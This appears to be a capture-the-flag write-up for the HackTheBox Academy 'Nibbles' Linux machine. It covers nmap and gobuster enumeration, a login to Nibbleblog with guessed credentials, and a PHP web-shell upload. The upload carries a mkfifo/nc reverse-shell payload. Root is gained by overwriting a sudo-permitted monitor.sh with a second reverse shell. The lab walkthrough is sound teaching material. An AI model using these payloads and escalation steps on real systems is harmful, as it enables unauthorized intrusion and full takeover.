# Nibbles

## Información General

<h3> Difficulty: <img src="https://img.shields.io/badge/Easy-green"> </h3>
<h3> SO: Linux</h3>
<h3> Exploited vulnerability: Unrestricted File Upload, Arbitrary File Upload, Sudo misconfiguration </h3>
<h3> Date: 20/02/2026</h3>
<h3> Link: <a href="https://academy.hackthebox.com/course/preview/getting-started" target="_blank">Nibbles - HTB academy</a></h3>

### **Read this document in spanish** <a href="Nibbles.md">Nibbles</a>

## Reconocimiento

**HTB** provides us with the IP address of the target machine: **10.129.12.250**

### Ping

Depending on the result, we can deduce whether it is a Linux or Windows machine, for example:

```
ping -c 1 10.129.12.250
```

**Its TTL is 63. Therefore, it's Linux.**

### Open port scan

#### TCP port scan

The command I use with nmap is:

```
nmap -sV -sC -sS --open 10.129.12.250
```

<p align="center"> 
<img src="images/nmap.png" width="600" alt="Resultado de Nmap">
</p>


| Open port | Service | Version                                                      |
| --------- | ------- | ------------------------------------------------------------ |
| 22        | ssh     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) |
| 80        | http    |  Apache httpd 2.4.18 ((Ubuntu))                              |

## Exploration

Investigating the source code of the website, I found the following:

<p align="center"> 
<img src="images/Nibbles.png" width="600" alt="Resultado de Nmap">
</p>

### Fuzzing web

```
gobuster dir -u http://10.129.12.250/nibbleblog/ -w /usr/share/dirb/wordlists/common.txt
```

<p align="center"> 
<img src="images/Nibles.png" width="600" alt="Resultado de Nmap">
</p>

Then the README file tells us what version it has:

<p align="center"> 
<img src="images/Nibbles-1.png" width="600" alt="Resultado de Nmap">
</p>

I try to access the machine's administration section and am surprised to find that, while investigating, the username **admin** and the password **nibbles**, assuming the machine is called nibbles, I am correct.

<p align="center"> 
<img src="images/Nibles-1.png" width="600" alt="Resultado de Nmap">
<img src="images/admin.png" width="600" alt="Resultado de Nmap">
</p>

## Exploitation

Navigating to **Plugins - My image** and uploading a **.php** image with the following content within the image:

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.171 4443 >/tmp/f"); ?>
```

We'll get a lot of errors, but it will work.

<p align="center"> 
<img src="images/php.png" width="600" alt="Resultado de Nmap">
</p>

Next, we navigate to the path where the image was saved: http://10.129.14.56/nibbleblog/content/private/plugins/my_image/

We managed to gain access within the system

<p align="center"> 
<img src="images/nc.png" width="600" alt="Resultado de Nmap">
</p>

We can get the flash from user.txt

## Subsequent Exploitation

### TTY 

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

### Escalation of Privileges

#### First command:

```
sudo -l
```

<p align="center"> 
<img src="images/sudo.png" width="600" alt="Resultado de Nmap">
</p>

This means that the path **/home/nibbler/personal/stuff/monitor.sh** has sudo privileges.

In the nibbler folder, there will be a .zip file. We compress it with the command **unzip**, then navigate to the location of the .sh script and do the following:

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.171 8443 >/tmp/f' > monitor.sh
```

Next, we activate the listening port

```
nc -lvnp 8443
```

Then we activate the script with the following command

```
sudo /home/nibbler/personal/stuff/monitor.sh
```

<p align="center"> 
<img src="images/root.png" width="600" alt="Resultado de Nmap">
</p>

## Conclusion

The _Nibbles_ machine from HTB Academy is an excellent option for those starting out in CTF, as it teaches a basic and very realistic workflow: initial enumeration, web application analysis, and privilege escalation in Linux. Despite being easy, it reinforces the importance of taking your time, taking notes, and not getting overconfident, since small protection mechanisms (like blocking by attempts) can cost you time if you don't enumerate correctly.